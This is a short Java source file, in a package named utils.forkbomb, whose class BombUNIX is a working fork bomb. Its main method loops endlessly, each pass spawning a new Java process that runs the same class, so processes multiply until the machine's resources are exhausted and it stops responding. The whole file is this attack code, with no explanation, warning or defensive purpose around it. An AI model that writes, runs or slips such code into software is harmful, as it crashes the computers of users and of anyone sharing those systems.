package utils.forkbomb;

import java.io.IOException;

public class BombUNIX {
    public static void main(String[] args) throws IOException {
        while (true)
            Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), BombUNIX.class.getName()});
    }
}